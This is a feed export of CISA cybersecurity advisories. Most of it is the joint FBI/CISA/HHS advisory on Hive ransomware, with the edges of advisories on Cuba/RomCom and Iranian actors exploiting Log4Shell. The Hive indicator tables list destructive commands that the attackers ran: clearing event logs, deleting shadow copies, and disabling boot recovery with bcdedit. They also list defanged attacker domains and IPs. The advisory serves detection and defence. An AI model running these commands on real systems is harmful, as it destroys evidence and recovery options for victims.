<p>FBI and CISA would like to thank BlackBerry, ESET, The National Cyber-Forensics and Training Alliance (NCFTA), Palo Alto Networks, and PRODAFT for their contributions to this CSA.</p>
<div>
<h3>References</h3>
</div>
<div class="field--item"><a href="https://unit42.paloaltonetworks.com/atoms/tropicalscorpius/">[1] Palo Alto Networks: Tropical Scorpius</a></div>
<div class="field--item"><a href="https://unit42.paloaltonetworks.com/cuba-ransomware-tropical-scorpius/">[2] Palo Alto Networks: Novel News on Cuba Ransomware - Greetings From Tropical Scorpius</a></div>
<div class="field--item"><a href="https://blogs.blackberry.com/en/2022/10/unattributed-romcom-threat-actor-spoofing-popular-apps-now-hits-ukrainian-militaries">[3] BlackBerry: Unattributed RomCom Threat Actor Spoofing Popular Apps Now Hits Ukrainian Militaries</a></div>
<div class="field--item"><a href="https://blogs.blackberry.com/en/2022/11/romcom-spoofing-solarwinds-keepass">[4] BlackBerry: RomCom Threat Actor Abuses KeePass and SolarWinds to Target Ukraine and Potentially the United Kingdom</a></div>
<div>
<h3>Revisions</h3>
</div>
<p>December 1, 2022: Initial Version|December 12, 2022: Added new IP addresses and IOCs</p>

## pubDate
Tue, 31 Jan 2023 16:32:46 EST
## dc:creator
CISA
## guid
## @isPermaLink
false
## #text
/node/17120
## -
## title
#StopRansomware: Hive Ransomware
## link
https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-321a
## description
<div>
<h3>Summary</h3>
</div>
<p>Actions to Take Today to Mitigate Cyber Threats from Ransomware:</p>
<p>• Prioritize remediating <a href="https://www.cisa.gov/known-exploited-vulnerabilities-catalog">known exploited vulnerabilities</a>.<br />
• Enable and enforce multifactor authentication with strong passwords<br />
• Close unused ports and remove any application not deemed necessary for day-to-day operations.</p>
<p><em>Note: This joint Cybersecurity Advisory (CSA) is part of an ongoing #StopRansomware effort to publish advisories for network defenders that detail various ransomware variants and ransomware threat actors. These #StopRansomware advisories include recently and historically observed tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs) to help organizations protect against ransomware. Visit <a href="https://www.cisa.gov/stopransomware">stopransomware.gov</a> to see all #StopRansomware advisories and to learn more about other ransomware threats and no-cost resources.</em></p>
<p>The Federal Bureau of Investigation (FBI), the Cybersecurity and Infrastructure Security Agency (CISA), and the Department of Health and Human Services (HHS) are releasing this joint CSA to disseminate known Hive IOCs and TTPs identified through FBI investigations as recently as November 2022.</p>
<p>FBI, CISA, and HHS encourage organizations to implement the recommendations in the Mitigations section of this CSA to reduce the likelihood and impact of ransomware incidents. Victims of ransomware operations should report the incident to their local FBI field office or CISA.</p>
<p>Download the PDF version of this report: <a href="https://www.cisa.gov/sites/default/files/publications/aa22-321a_joint_csa_stopransomware_hive.pdf">pdf, 852.9 kb</a>.</p>
<p>For a downloadable copy of IOCs, see <a href="https://www.cisa.gov/sites/default/files/publications/AA22-321A.stix.xml">AA22-321A.stix</a> (STIX, 43.6 kb).</p>
<div>
<h3>Technical Details</h3>
</div>
<p><em>Note: This advisory uses the MITRE ATT&CK® for Enterprise framework, version 12. See <a href="https://attack.mitre.org/versions/v12/matrices/enterprise/">MITRE ATT&CK for Enterprise</a> for all referenced tactics and techniques.</em></p>
<p>As of November 2022, Hive ransomware actors have victimized over 1,300 companies worldwide, receiving approximately US$100 million in ransom payments, according to FBI information. Hive ransomware follows the ransomware-as-a-service (RaaS) model in which developers create, maintain, and update the malware, and affiliates conduct the ransomware attacks. From June 2021 through at least November 2022, threat actors have used Hive ransomware to target a wide range of businesses and critical infrastructure sectors, including Government Facilities, Communications, Critical Manufacturing, Information Technology, and especially Healthcare and Public Health (HPH).</p>
<p>The method of initial intrusion will depend on which affiliate targets the network. Hive actors have gained initial access to victim networks by using single factor logins via Remote Desktop Protocol (RDP), virtual private networks (VPNs), and other remote network connection protocols [<a href="https://attack.mitre.org/versions/v12/techniques/T1133/">T1133</a>]. In some cases, Hive actors have bypassed multifactor authentication (MFA) and gained access to FortiOS servers by exploiting Common Vulnerabilities and Exposures (CVE) <a href="https://nvd.nist.gov/vuln/detail/CVE-2020-12812">CVE-2020-12812</a>. This vulnerability enables a malicious cyber actor to log in without a prompt for the user’s second authentication factor (FortiToken) when the actor changes the case of the username.</p>
<p>Hive actors have also gained initial access to victim networks by distributing phishing emails with malicious attachments [<a href="https://attack.mitre.org/versions/v12/techniques/T1566/001/">T1566.001</a>] and by exploiting the following vulnerabilities against Microsoft Exchange servers [<a href="https://attack.mitre.org/versions/v12/techniques/T1190/">T1190</a>]:</p>
<ul><li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-31207">CVE-2021-31207</a> - Microsoft Exchange Server Security Feature Bypass Vulnerability</li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-34473">CVE-2021-34473</a> - Microsoft Exchange Server Remote Code Execution Vulnerability</li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-34523">CVE-2021-34523</a> - Microsoft Exchange Server Privilege Escalation Vulnerability</li>
</ul><p>After gaining access, Hive ransomware attempts to evade detention by executing processes to:</p>
<ul><li>Identify processes related to backups, antivirus/anti-spyware, and file copying and then terminating those processes to facilitate file encryption [<a href="https://attack.mitre.org/versions/v12/techniques/T1562/001/">T1562</a>].</li>
<li>Stop the volume shadow copy services and remove all existing shadow copies via vssadmin on command line or via PowerShell [<a href="https://attack.mitre.org/versions/v12/techniques/T1059/">T1059</a>] [<a href="https://attack.mitre.org/versions/v12/techniques/T1490/">T1490</a>].</li>
<li>Delete Windows event logs, specifically the System, Security and Application logs [<a href="https://attack.mitre.org/versions/v12/techniques/T1070/">T1070</a>].</li>
</ul><p>Prior to encryption, Hive ransomware removes virus definitions and disables all portions of Windows Defender and other common antivirus programs in the system registry [<a href="https://attack.mitre.org/versions/v12/techniques/T1112/">T1112</a>].</p>
<p>Hive actors exfiltrate data likely using a combination of Rclone and the cloud storage service Mega.nz [<a href="https://attack.mitre.org/versions/v12/techniques/T1537/">T1537</a>]. In addition to its capabilities against the Microsoft Windows operating system, Hive ransomware has known variants for Linux, VMware ESXi, and FreeBSD.</p>
<p>During the encryption process, a file named *.key (previously *.key.*) is created in the root directory (C:\ or /root/). Required for decryption, this key file only exists on the machine where it was created and cannot be reproduced. The ransom note, HOW_TO_DECRYPT.txt is dropped into each affected directory and states the *.key file cannot be modified, renamed, or deleted, otherwise the encrypted files cannot be recovered [<a href="https://attack.mitre.org/versions/v12/techniques/T1486/">T1486</a>]. The ransom note contains a “sales department” .onion link accessible through a TOR browser, enabling victim organizations to contact the actors through a live chat panel to discuss payment for their files. However, some victims reported receiving phone calls or emails from Hive actors directly to discuss payment.</p>
<p>The ransom note also threatens victims that a public disclosure or leak site accessible on the TOR site, “HiveLeaks”, contains data exfiltrated from victim organizations who do not pay the ransom demand (see figure 1 below). Additionally, Hive actors have used anonymous file sharing sites to disclose exfiltrated data (see table 1 below).</p>
<p>


<figure class="c-figure u-align-center" role="group"><div class="c-figure__media"><img alt="" data-entity-type="file" data-entity-uuid="d1b2986e-6ab4-424f-bb36-72b8d9e06b65" src="https://www.cisa.gov/sites/default/files/publications/How%20to%20Decrypt.png" /></div>
      <figcaption class="c-figure__caption"><em>Figure 1: Sample Hive Ransom Note</em></figcaption></figure></p><p> </p>
<table><caption><em>Table 1: Anonymous File Sharing Sites Used to Disclose Data</em></caption>
<tbody><tr><td>
<p><a>https://anonfiles[.]com</a></p>
</td>
</tr><tr><td>
<p>https://mega[.]nz</p>
</td>
</tr><tr><td>
<p>https://send.exploit[.]in</p>
</td>
</tr><tr><td>
<p>https://ufile[.]io</p>
</td>
</tr><tr><td>
<p>https://www.sendspace[.]com</p>
</td>
</tr><tr><td>
<p>https://privatlab[.]net</p>
</td>
</tr><tr><td>
<p>https://privatlab[.]com</p>
</td>
</tr></tbody></table><p> </p>
<p>Once the victim organization contacts Hive actors on the live chat panel, Hive actors communicate the ransom amount and the payment deadline. Hive actors negotiate ransom demands in U.S. dollars, with initial amounts ranging from several thousand to millions of dollars. Hive actors demand payment in Bitcoin.</p>
<p>Hive actors have been known to reinfect—with either Hive ransomware or another ransomware variant—the networks of victim organizations who have restored their network without making a ransom payment.</p>
<h4><strong>Indicators of Compromise</strong></h4>
<p>Threat actors have leveraged the following IOCs during Hive ransomware compromises. Note: Some of these indicators are legitimate applications that Hive threat actors used to aid in further malicious exploitation. FBI, CISA, and HHS recommend removing any application not deemed necessary for day-to-day operations. See tables 2–3 below for IOCs obtained from FBI threat response investigations as recently as November 2022.</p>
<table class="Table"><caption><em>Table 2: Known IOCs as of November 2022</em></caption>
<tbody><tr><td>
<p>Known IOCs - Files</p>
</td>
</tr><tr><td>
<p>HOW_TO_DECRYPT.txt typically in directories with encrypted files</p>
</td>
</tr><tr><td>
<p>*.key typically in the root directory, i.e., C:\ or /root</p>
</td>
</tr><tr><td>
<p>hive.bat</p>
</td>
</tr><tr><td>
<p>shadow.bat </p>
</td>
</tr><tr><td>
<p>asq.r77vh0[.]pw - Server hosted malicious HTA file</p>
</td>
</tr><tr><td>
<p>asq.d6shiiwz[.]pw - Server referenced in malicious regsvr32 execution</p>
</td>
</tr><tr><td>
<p>asq.swhw71un[.]pw - Server hosted malicious HTA file</p>
</td>
</tr><tr><td>
<p>asd.s7610rir[.]pw - Server hosted malicious HTA file</p>
</td>
</tr><tr><td>
<p>Windows_x64_encrypt.dll </p>
</td>
</tr><tr><td>
<p>Windows_x64_encrypt.exe </p>
</td>
</tr><tr><td>
<p>Windows_x32_encrypt.dll</p>
</td>
</tr><tr><td>
<p>Windows_x32_encrypt.exe</p>
</td>
</tr><tr><td>
<p>Linux_encrypt</p>
</td>
</tr><tr><td>
<p>Esxi_encrypt</p>
</td>
</tr><tr><td>
<p>Known IOCs – Events </p>
</td>
</tr><tr><td>
<p>System, Security and Application Windows event logs wiped</p>
</td>
</tr><tr><td>
<p>Microsoft Windows Defender AntiSpyware Protection disabled </p>
</td>
</tr><tr><td>
<p>Microsoft Windows Defender AntiVirus Protection disabled </p>
</td>
</tr><tr><td>
<p>Volume shadow copies deleted</p>
</td>
</tr><tr><td>
<p>Normal boot process prevented</p>
</td>
</tr><tr><td>
<p>Known IOCs – Logged Processes</p>
</td>
</tr><tr><td>
<p>wevtutil.exe cl system</p>
</td>
</tr><tr><td>
<p>wevtutil.exe cl security</p>
</td>
</tr><tr><td>
<p>wevtutil.exe cl application</p>
</td>
</tr><tr><td>
<p>vssadmin.exe delete shadows /all /quiet</p>
</td>
</tr><tr><td>
<p>wmic.exe SHADOWCOPY /nointeractive</p>
</td>
</tr><tr><td>
<p>wmic.exe shadowcopy delete</p>
</td>
</tr><tr><td>
<p>bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures</p>
</td>
</tr><tr><td>
<p>bcdedit.exe /set {default} recoveryenabled no</p>
</td>
</tr></tbody></table><p> </p>
<table class="Table"><caption><em>Table 3: Potential IOC IP Addresses as of November 2022</em></caption>
<caption>Note: Some of these observed IP addresses are more than a year old. FBI and CISA recommend vetting or investigating these IP addresses prior to taking forward-looking action like blocking.</caption>
<tbody><tr><td>
<p><a>Potential IOC IP Addresses for Compromise or Exfil:</a></p>
</td>
</tr><tr><td>
<p>84.32.188[.]57</p>
</td>
<td>
<p>84.32.188[.]238</p>
</td>
</tr><tr><td>
<p>93.115.26[.]251</p>
</td>
<td>
<p>185.8.105[.]67</p>
</td>
</tr><tr><td>
<p>181.231.81[.]239</p>
</td>
<td>
<p>185.8.105[.]112</p>
</td>
</tr><tr><td>
<p>186.111.136[.]37</p>
</td>
<td>
<p>192.53.123[.]202</p>
</td>
</tr><tr><td>
<p>158.69.36[.]149</p>
</td>
<td>
<p>46.166.161[.]123</p>
</td>
</tr><tr><td>
<p>108.62.118[.]190</p>
</td>
<td>
<p>46.166.161[.]93</p>
</td>
</tr><tr><td>
<p>185.247.71[.]106</p>
</td>
<td>
<p>46.166.162[.]125</p>
</td>
</tr><tr><td>
<p>5.61.37[.]207</p>
</td>
<td>
<p>46.166.162[.]96</p>
</td>
</tr><tr><td>
<p>185.8.105[.]103</p>
</td>
<td>
<p>46.166.169[.]34</p>
</td>
</tr><tr><td>
<p>5.199.162[.]220</p>
</td>
<td>
<p>93.115.25[.]139</p>
</td>
</tr><tr><td>
<p>5.199.162[.]229</p>
</td>
<td>
<p>93.115.27[.]148</p>
</td>
</tr><tr><td>
<p>89.147.109[.]208</p>
</td>
<td>
<p>83.97.20[.]81</p>
</td>
</tr><tr><td>
<p>5.61.37[.]207</p>
</td>
<td>
<p>5.199.162[.]220</p>
</td>
</tr><tr><td>
<p>5.199.162[.]229;</p>
</td>
<td>
<p>46.166.161[.]93</p>
</td>
</tr><tr><td>
<p>46.166.161[.]123;</p>
</td>
<td>
<p>46.166.162[.]96</p>
</td>
</tr><tr><td>
<p>46.166.162[.]125</p>
</td>
<td>
<p>46.166.169[.]34</p>
</td>
</tr><tr><td>
<p>83.97.20[.]81</p>
</td>
<td>
<p>84.32.188[.]238</p>
</td>
</tr><tr><td>
<p>84.32.188[.]57</p>
</td>
<td>
<p>89.147.109[.]208</p>
</td>
</tr><tr><td>
<p>93.115.25[.]139;</p>
</td>
<td>
<p>93.115.26[.]251</p>
</td>
</tr><tr><td>
<p>93.115.27[.]148</p>
</td>
<td>
<p>108.62.118[.]190</p>
</td>
</tr><tr><td>
<p>158.69.36[.]149/span></p>
</td>
<td>
<p>181.231.81[.]239</p>
</td>
</tr><tr><td>
<p>185.8.105[.]67</p>
</td>
<td>
<p>185.8.105[.]103</p>
</td>
</tr><tr><td>
<p>185.8.105[.]112</p>
</td>
<td>
<p>185.247.71[.]106</p>
</td>
</tr><tr><td>
<p>186.111.136[.]37</p>
</td>
<td>
<p>192.53.123[.]202</p>
</td>
</tr></tbody></table><p> </p>
<h4><strong>MITRE ATT&CK TECHNIQUES</strong></h4>
<p>See table 4 for all referenced threat actor tactics and techniques listed in this advisory.</p>
<table><caption>Table 4: Hive Actors ATT&CK Techniques for Enterprise</caption>
<tbody><tr><td>
<p><u>Initial Access</u></p>
</td>
</tr><tr><td>
<p>Technique Title</p>
</td>
<td>
<p>ID</p>
</td>
<td>
<p>Use</p>
</td>
</tr><tr><td>
<p>External Remote Services</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v12/techniques/T1133/">T1133</a></p>
</td>
<td>
<p>Hive actors gain access to victim networks by using single factor logins via RDP, VPN, and other remote network connection protocols.</p>
</td>
</tr><tr><td>
<p>Exploit Public-Facing Application</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v12/techniques/T1190/">T1190</a></p>
</td>
<td>
<p>Hive actors gain access to victim network by exploiting the following Microsoft Exchange vulnerabilities: CVE-2021-34473, CVE-2021-34523, CVE-2021-31207, CVE-2021-42321.</p>
</td>
</tr><tr><td>
<p>Phishing</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v12/techniques/T1566/001/">T1566.001</a></p>
</td>
<td>
<p>Hive actors gain access to victim networks by distributing phishing emails with malicious attachments.</p>
</td>
</tr><tr><td>
<p><u>Execution</u></p>
</td>
</tr><tr><td>
<p>Technique Title</p>
</td>
<td>
<p>ID</p>
</td>
<td>
<p>Use</p>
</td>
</tr><tr><td>
<p>Command and Scripting Interpreter</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v12/techniques/T1059/">T1059</a></p>
</td>
<td>
<p>Hive actors looks to stop the volume shadow copy services and remove all existing shadow copies via vssadmin on command line or PowerShell.</p>
</td>
</tr><tr><td>
<p><u>Defense Evasion</u></p>
</td>
</tr><tr><td>
<p>Technique Title</p>
</td>
<td>
<p>ID</p>
</td>
<td>
<p>Use</p>
</td>
</tr><tr><td>
<p>Indicator Removal on Host</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v12/techniques/T1070/">T1070</a></p>
</td>
<td>
<p>Hive actors delete Windows event logs, specifically, the System, Security and Application logs.</p>
</td>
</tr><tr><td>
<p>Modify Registry</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v12/techniques/T1112/">T1112</a></p>
</td>
<td>
<p>Hive actors set registry values for DisableAntiSpyware and DisableAntiVirus to 1.</p>
</td>
</tr><tr><td>
<p>Impair Defenses</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v12/techniques/T1562/001/">T1562</a></p>
</td>
<td>
<p>Hive actors seek processes related to backups, antivirus/anti-spyware, and file copying and terminates those processes to facilitate file encryption.</p>
</td>
</tr><tr><td>
<p><u>Exfiltration</u></p>
</td>
</tr><tr><td>
<p>Technique Title</p>
</td>
<td>
<p>ID</p>
</td>
<td>
<p>Use</p>
</td>
</tr><tr><td>
<p>Transfer Data to Cloud Account</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v12/techniques/T1537/">T1537</a></p>
</td>
<td>
<p>Hive actors exfiltrate data from victims, using a possible combination of Rclone and the cloud storage service Mega.nz.</p>
</td>
</tr><tr><td>
<p><u>Impact</u></p>
</td>
</tr><tr><td>
<p>Technique Title</p>
</td>
<td>
<p> </p>
</td>
<td>
<p>Use</p>
</td>
</tr><tr><td>
<p>Data Encrypted for Impact</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v12/techniques/T1486/">T1486</a></p>
</td>
<td>
<p>Hive actors deploy a ransom note HOW_TO_DECRYPT.txt into each affected directory which states the *.key file cannot be modified, renamed, or deleted, otherwise the encrypted files cannot be recovered.</p>
</td>
</tr><tr><td>
<p>Inhibit System Recovery</p>
</td>
<td>
<p><a href="https://attack.mitre.org/versions/v12/techniques/T1490/">T1490</a></p>
</td>
<td>
<p>Hive actors looks to stop the volume shadow copy services and remove all existing shadow copies via vssadmin via command line or PowerShell.</p>
</td>
</tr></tbody></table><div>
<h3>Mitigations</h3>
</div>
<p>FBI, CISA, and HHS recommend organizations, particularly in the HPH sector, implement the following to limit potential adversarial use of common system and network discovery techniques and to reduce the risk of compromise by Hive ransomware:</p>
<ul><li>Verify Hive actors no longer have access to the network.</li>
<li>Install updates for operating systems, software, and firmware as soon as they are released. Prioritize patching VPN servers, remote access software, virtual machine software, and <a href="https://www.cisa.gov/known-exploited-vulnerabilities-catalog">known exploited vulnerabilities</a>. Consider leveraging a centralized patch management system to automate and expedite the process.</li>
<li>Require <a href="https://www.cisa.gov/sites/default/files/publications/fact-sheet-implementing-phishing-resistant-mfa-508c.pdf">phishing-resistant MFA</a> for as many services as possible—particularly for webmail, VPNs, accounts that access critical systems, and privileged accounts that manage backups.</li>
<li>If used, secure and monitor RDP.
<ul><li>Limit access to resources over internal networks, especially by restricting RDP and using virtual desktop infrastructure.</li>
<li>After assessing risks, if you deem RDP operationally necessary, restrict the originating sources and require MFA to mitigate credential theft and reuse.</li>
<li>If RDP must be available externally, use a VPN, virtual desktop infrastructure, or other means to authenticate and secure the connection before allowing RDP to connect to internal devices.</li>
<li>Monitor remote access/RDP logs, enforce account lockouts after a specified number of attempts to block brute force campaigns, log RDP login attempts, and disable unused remote access/RDP ports.</li>
<li>Be sure to properly configure devices and enable security features.</li>
<li>Disable ports and protocols not used for business purposes, such as RDP Port 3389/TCP.</li>
</ul></li>
<li>Maintain offline backups of data, and regularly maintain backup and restoration. By instituting this practice, the organization ensures they will not be severely interrupted, and/or only have irretrievable data.</li>
<li>Ensure all backup data is encrypted, immutable (i.e., cannot be altered or deleted), and covers the entire organization’s data infrastructure. Ensure your backup data is not already infected.,</li>
<li>Monitor cyber threat reporting regarding the publication of compromised VPN login credentials and change passwords/settings if applicable.</li>
<li>Install and regularly update anti-virus or anti-malware software on all hosts.</li>
<li>Enable PowerShell Logging including module logging, script block logging and transcription.</li>
<li>Install an enhanced monitoring tool such as Sysmon from Microsoft for increased logging.</li>
<li>Review the following additional resources.
<ul><li>The joint advisory from Australia, Canada, New Zealand, the United Kingdom, and the United States on <a href="https://us-cert.cisa.gov/ncas/alerts/aa20-245a">Technical Approaches to Uncovering and Remediating Malicious Activity</a> provides additional guidance when hunting or investigating a network and common mistakes to avoid in incident handling.</li>
<li>The Cybersecurity and Infrastructure Security Agency-Multi-State Information Sharing & Analysis Center <a href="https://www.cisa.gov/stopransomware/ransomware-guide">Joint Ransomware Guide</a> covers additional best practices and ways to prevent, protect, and respond to a ransomware attack.</li>
<li><a href="https://www.cisa.gov/stopransomware">StopRansomware.gov</a> is the U.S. Government’s official one-stop location for resources to tackle ransomware more effectively.</li>
</ul></li>
</ul><p>If your organization is impacted by a ransomware incident, FBI, CISA, and HHS recommend the following actions.</p>
<ul><li><strong>Isolate the infected system</strong>. Remove the infected system from all networks, and disable the computer’s wireless, Bluetooth, and any other potential networking capabilities. Ensure all shared and networked drives are disconnected.</li>
<li><strong>Turn off other computers and devices</strong>. Power-off and segregate (i.e., remove from the network) the infected computer(s). Power-off and segregate any other computers or devices that share a network with the infected computer(s) that have not been fully encrypted by ransomware. If possible, collect and secure all infected and potentially infected computers and devices in a central location, making sure to clearly label any computers that have been encrypted. Powering-off and segregating infected computers and computers that have not been fully encrypted may allow for the recovery of partially encrypted files by specialists.</li>
<li><strong>Secure your backups</strong>. Ensure that your backup data is offline and secure. If possible, scan your backup data with an antivirus program to check that it is free of malware.</li>
</ul><p>In addition, FBI, CISA, and HHS urge all organizations to apply the following recommendations to prepare for, mitigate/prevent, and respond to ransomware incidents.</p>
<h4><strong>Preparing for Cyber Incidents</strong></h4>
<ul><li><strong>Review the security posture of third-party vendors and those interconnected with your organization</strong>. Ensure all connections between third-party vendors and outside software or hardware are monitored and reviewed for suspicious activity.</li>
<li><strong>Implement listing policies for applications and remote access that only allow systems to execute known and permitted programs</strong> under an established security policy.</li>
<li><strong>Document and monitor external remote connections</strong>. Organizations should document approved solutions for remote management and maintenance, and immediately investigate if an unapproved solution is installed on a workstation.</li>
<li><strong>Implement a recovery plan</strong> to maintain and retain multiple copies of sensitive or proprietary data and servers in a physically separate, segmented, and secure location (i.e., hard drive, storage device, the cloud).</li>
</ul><h4><strong>Identity and Access Management</strong></h4>
<ul><li><strong>Require all accounts</strong> with password logins (e.g., service account, admin accounts, and domain admin accounts) to comply with <a href="https://pages.nist.gov/800-63-3/">National Institute of Standards and Technology (NIST) standards</a> for developing and managing password policies.
<ul><li>Use longer passwords consisting of at least 8 characters and no more than 64 characters in length.</li>
<li>Store passwords in hashed format using industry-recognized password managers.</li>
<li>Add password user “salts” to shared login credentials.</li>
<li>Avoid reusing passwords.</li>
<li>Implement multiple failed login attempt account lockouts.</li>
<li>Disable password “hints.”</li>
<li>Refrain from requiring password changes more frequently than once per year unless a password is known or suspected to be compromised.<br />
		Note: NIST guidance suggests favoring longer passwords instead of requiring regular and frequent password resets. Frequent password resets are more likely to result in users developing password “patterns” cyber criminals can easily decipher.</li>
<li>Require administrator credentials to install software.</li>
</ul></li>
<li><strong>Require phishing-resistant multifactor authentication</strong> for all services to the extent possible, particularly for webmail, virtual private networks, and accounts that access critical systems.</li>
<li><strong>Review domain controllers, servers, workstations, and active directories</strong> for new and/or unrecognized accounts.</li>
<li><strong>Audit user accounts</strong> with administrative privileges and configure access controls according to the principle of least privilege.</li>
<li><strong>Implement time-based access for accounts set at the admin level and higher</strong>. For example, the Just-in-Time (JIT) access method provisions privileged access when needed and can support enforcement of the principle of least privilege (as well as the Zero Trust model). This is a process where a network-wide policy is set in place to automatically disable admin accounts at the Active Directory level when the account is not in direct need. Individual users may submit their requests through an automated process that grants them access to a specified system for a set timeframe when they need to support the completion of a certain task. </li>
</ul><h4><strong>Protective Controls and Architecture</strong></h4>
<ul><li><strong>Segment networks</strong> to prevent the spread of ransomware. Network segmentation can help prevent the spread of ransomware by controlling traffic flows between—and access to—various subnetworks and by restricting adversary lateral movement.</li>
<li><strong>Identify, detect, and investigate abnormal activity and potential traversal of the indicated ransomware with a networking monitoring tool</strong>. To aid in detecting the ransomware, implement a tool that logs and reports all network traffic, including lateral movement activity on a network. Endpoint detection and response (EDR) tools are particularly useful for detecting lateral connections as they have insight into common and uncommon network connections for each host.</li>
<li>Install, regularly update, and enable real time detection for antivirus software on all hosts.</li>
</ul><p>Vulnerability and Configuration Management</p>
<ul><li><strong>Consider adding an email banner to emails</strong> received from outside your organization.</li>
<li><strong>Disable command-line and scripting activities and permissions</strong>. Privilege escalation and lateral movement often depend on software utilities running from the command line. If threat actors are not able to run these tools, they will have difficulty escalating privileges and/or moving laterally.</li>
<li><strong>Ensure devices are properly configured and that security features are enabled</strong>. </li>
<li><strong>Restrict Server Message Block (SMB) Protocol within the network to only access necessary servers and remove or disable outdated versions of SMB</strong> (i.e., SMB version 1). Threat actors use SMB to propagate malware across organizations.</li>
</ul><h4><strong>REFERENCES</strong></h4>
<ul><li><a href="http://www.stopransomware.gov/">Stopransomware.gov</a> is a whole-of-government approach that gives one central location for ransomware resources and alerts.</li>
<li>Resource to mitigate a ransomware attack: <a href="https://www.cisa.gov/sites/default/files/publications/CISA_MS-ISAC_Ransomware%20Guide_S508C.pdf">CISA-Multi-State Information Sharing and Analysis Center (MS-ISAC) Joint Ransomware Guide</a>.</li>
<li>No-cost cyber hygiene services: <a href="https://www.cisa.gov/cyber-hygiene-services">Cyber Hygiene Services</a> and <a href="https://github.com/cisagov/cset/">Ransomware Readiness Assessment</a>.</li>
</ul><h4><strong>INFORMATION REQUESTED</strong></h4>
<p>The FBI, CISA, and HHS do not encourage paying a ransom to criminal actors. Paying a ransom may embolden adversaries to target additional organizations, encourage other criminal actors to engage in the distribution of ransomware, and/or fund illicit activities. Paying the ransom also does not guarantee that a victim’s files will be recovered. However, the FBI, CISA, and HHS understand that when businesses are faced with an inability to function, executives will evaluate all options to protect their shareholders, employees, and customers. Regardless of whether you or your organization decide to pay the ransom, the FBI, CISA, and HHS urge you to promptly report ransomware incidents to your <a href="https://www.fbi.gov/contact-us/field-offices">local FBI field office</a>, or to CISA at <a href="mailto:report@cisa.gov">report@cisa.gov</a> or (888) 282-0870. Doing so provides investigators with the critical information they need to track ransomware attackers, hold them accountable under US law, and prevent future attacks. </p>
<p>The FBI may seek the following information that you determine you can legally share, including:</p>
<ul><li>Recovered executable files</li>
<li>Live random access memory (RAM) capture</li>
<li>Images of infected systems</li>
<li>Malware samples</li>
<li>IP addresses identified as malicious or suspicious</li>
<li>Email addresses of the attackers</li>
<li>A copy of the ransom note</li>
<li>Ransom amount</li>
<li>Bitcoin wallets used by the attackers</li>
<li>Bitcoin wallets used to pay the ransom</li>
<li>Post-incident forensic reports</li>
</ul><h4>DISCLAIMER</h4>
<p>The information in this report is being provided “as is” for informational purposes only. FBI, CISA, and HHS do not endorse any commercial product or service, including any subjects of analysis. Any reference to specific commercial products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by FBI, CISA, or HHS.</p>
<p> </p>
<div>
<h3>Revisions</h3>
</div>
<p>Initial Version: November 17, 2022</p>

## pubDate
Tue, 31 Jan 2023 16:32:46 EST
## dc:creator
CISA
## guid
## @isPermaLink
false
## #text
/node/17118
## -
## title
Iranian Government-Sponsored APT Actors Compromise Federal Network, Deploy Crypto Miner, Credential Harvester
## link
https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-320a
## description
<div>
<h3>Summary</h3>
</div>
<p>From mid-June through mid-July 2022, CISA conducted an incident response engagement at a Federal Civilian Executive Branch (FCEB) organization where CISA observed suspected advanced persistent threat (APT) activity. In the course of incident response activities, CISA determined that cyber threat actors exploited the Log4Shell vulnerability in an unpatched VMware Horizon server, installed XMRig crypto mining software, moved laterally to the domain controller (DC), compromised credentials, and then implanted Ngrok reverse proxies on several hosts to maintain persistence. CISA and the Federal Bureau of Investigation (FBI) assess that the FCEB network was compromised by Iranian government-sponsored APT actors.</p>
<p>CISA and FBI are releasing this Cybersecurity Advisory (CSA) providing the suspected Iranian government-sponsored actors’ tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs) to help network defenders detect and protect against related compromises.</p>
<p>CISA and FBI encourage all organizations with affected VMware systems that did not immediately apply available patches or workarounds to assume compromise and initiate threat hunting activities. If suspected initial access or compromise is detected based on IOCs or TTPs described in this CSA, CISA and FBI encourage organizations to assume lateral movement by threat actors, investigate connected systems (including the DC), and audit privileged accounts. All organizations, regardless of identified evidence of compromise, should apply the recommendations in the Mitigations section of this CSA to protect against similar malicious cyber activity.</p>
<p>For more information on Iranian government-sponsored Iranian malicious cyber activity, see CISA’s <a href="https://www.cisa.gov/uscert/iran">Iran Cyber Threat Overview and Advisories</a> webpage and FBI’s <a href="https://www.fbi.gov/investigate/counterintelligence/the-iran-threat">Iran Threats</a> webpage.</p>
<p>Download the PDF version of this report: <a href="https://www.cisa.gov/sites/default/files/publications/aa22-320a_joint_csa_iranian_government-sponsored_apt_actors_compromise_federal%20network_deploy_crypto%20miner_credential_harvester.pdf">pdf, 528 kb</a>.</p>
<p>For a downloadable copy of the Malware Analysis Report (MAR) accompanying this report, see: <a href="https://www.cisa.gov/uscert/ncas/analysis-reports/ar22-320a">MAR 10387061-1.v1</a>.</p>
<p>For a downloadable copy of IOCs, see: <a href="https://www.cisa.gov/sites/default/files/publications/AA22-320A.stix.xml">AA22-320A.stix, 1.55 mb</a>.</p>
<div>
<h3>Technical Details</h3>
</div>
<p>Note: This advisory uses the <a href="https://attack.mitre.org/versions/v11/matrices/enterprise/">MITRE ATT&CK for Enterprise</a> framework, version 11. See the MITRE ATT&CK Tactics and Techniques section for a table of the threat actors’ activity mapped to MITRE ATT&CK® tactics and techniques with corresponding mitigation and/or detection recommendations.</p>
<h4><strong>Overview</strong></h4>
